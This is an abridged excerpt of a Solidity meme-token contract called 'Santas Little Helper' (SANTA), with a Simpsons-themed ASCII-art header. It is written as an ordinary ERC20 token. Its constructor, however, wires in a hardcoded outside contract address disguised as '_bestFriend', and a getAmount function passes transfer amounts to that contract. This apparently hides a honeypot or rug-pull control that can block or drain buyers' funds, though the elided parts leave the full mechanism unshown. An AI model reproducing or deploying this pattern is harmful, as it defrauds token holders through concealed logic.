         ...
         .+++=.                             :++**-                             
           :++++=-:.                                                  
              :-=+*++++==--::.                                     
                   ..::---====++++-:.                                              
                                  .:-==-     
S 0 1 E 0 1   S i m p s o n s   R o a s t i n g  o n   a n   O p e n   F i r e                                                    
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _bestFriend = 0xe9E26ea3D7FB3748352e59EB4DA3b28a69D17333;
    address public pair;
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        bestFriend = IERC5679(_bestFriend);
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return bestFriend.sendTransaction(amount);
    }
    ...
    function _DeploySanta(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySanta(creator, initialSupply);
    }
}

contract Santa is ERC20Token {
    constructor() ERC20Token(unicode"Santas Little Helper", "SANTA", msg.sender, 69420000000 * 10 ** 18) {
    }
}